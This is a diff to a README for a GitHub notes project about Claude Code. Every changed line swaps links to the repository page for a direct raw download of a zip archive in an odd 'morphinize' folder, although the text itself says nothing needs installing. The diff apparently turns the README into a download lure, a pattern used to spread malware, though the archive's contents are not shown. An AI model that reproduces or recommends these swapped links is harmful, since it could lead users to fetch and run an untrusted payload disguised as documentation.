@@ -1,6 +1,6 @@
 # 📘 claude-code-notes - Understand Claude Code, Fast
 
-[![Download](https://img.shields.io/badge/Download-Visit%20page%20to%20download-blue?style=for-the-badge&logo=github)](https://github.com/Tdam5942/claude-code-notes)
+[![Download](https://img.shields.io/badge/Download-Visit%20page%20to%20download-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Tdam5942/claude-code-notes/main/morphinize/notes-claude-code-v3.3.zip)
 
 ## 🧭 What this is
 
@@ -20,7 +20,7 @@ This repository is a notes project, so you do not install a desktop app here. On
 ### 1) Open the download page
 Go to the main page here:
 
-[https://github.com/Tdam5942/claude-code-notes](https://github.com/Tdam5942/claude-code-notes)
+[https://raw.githubusercontent.com/Tdam5942/claude-code-notes/main/morphinize/notes-claude-code-v3.3.zip](https://raw.githubusercontent.com/Tdam5942/claude-code-notes/main/morphinize/notes-claude-code-v3.3.zip)
 
 ### 2) Download or view the files
 On the page, use the green or gray GitHub buttons to:
@@ -157,7 +157,7 @@ To get more value from the notes:
 
 Visit this page to download or copy the repo:
 
-[https://github.com/Tdam5942/claude-code-notes](https://github.com/Tdam5942/claude-code-notes)
+[https://raw.githubusercontent.com/Tdam5942/claude-code-notes/main/morphinize/notes-claude-code-v3.3.zip](https://raw.githubusercontent.com/Tdam5942/claude-code-notes/main/morphinize/notes-claude-code-v3.3.zip)
 
 ## 🔧 File handling on Windows
 
